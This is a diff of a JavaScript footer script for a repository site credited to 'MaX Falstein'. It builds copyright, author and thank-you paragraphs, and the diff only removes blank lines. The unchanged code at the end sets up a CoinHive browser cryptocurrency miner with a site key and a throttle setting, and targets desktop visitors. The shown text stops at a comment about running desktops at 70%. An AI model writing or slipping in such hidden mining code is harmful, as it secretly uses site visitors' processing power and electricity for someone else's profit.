@@ -21,7 +21,6 @@ var footerMonth = document.createTextNode(month);
 var gap = document.createTextNode(" ");
 var footerYear = document.createTextNode(year);
 var patent = document.createTextNode(" - Patents & Trademarks Pending");
-
 var p = document.createElement("P");
 p.appendChild(mfA);
 p.appendChild(copy);
@@ -33,7 +32,6 @@ p.appendChild(footerMonth);
 p.appendChild(gap);
 p.appendChild(footerYear);
 p.appendChild(patent);
-
 var p2 = document.createElement("P");
 var mfB = document.createTextNode("MaX Falstein");
 var br = document.createElement("BR");
@@ -41,17 +39,14 @@ var mfB2 = document.createTextNode("Computer Stack (H/W, Net, Security, S/W) Arc
 p2.appendChild(mfB);
 p2.appendChild(br);
 p2.appendChild(mfB2);
-
 var p3 = document.createElement("P");
 var mfC = document.createTextNode("A quick little message from MaX saying thank you for visiting the repository!");
 p3.appendChild(mfC);
-
 var footer = document.createElement("FOOTER");
 footer.appendChild(p);
 footer.appendChild(p2);
 footer.appendChild(p3);
 document.getElementById("body").appendChild(footer);
-
 var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
 if (!minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
   // desktop @ 70%
